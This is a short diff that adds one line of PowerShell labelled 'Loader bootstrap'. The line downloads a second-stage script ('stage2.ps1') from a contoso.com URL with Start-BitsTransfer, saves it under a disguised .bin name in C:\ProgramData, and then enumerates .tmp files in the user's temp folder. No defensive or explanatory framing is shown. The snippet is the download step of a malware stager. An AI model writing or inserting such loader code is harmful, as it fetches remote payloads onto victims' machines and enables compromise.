@@ -1,0 +1,1 @@
+<# Loader bootstrap #> $Stage1Url = "http://contoso.com:80/stage2.ps1"; $LocalPath = 'C:\ProgramData\stage2.bin'; Start-BitsTransfer -Source $Stage1Url -Destination $LocalPath; Get-ChildItem -Path $env:TEMP -Filter "*.tmp" | Select-Object -First 3
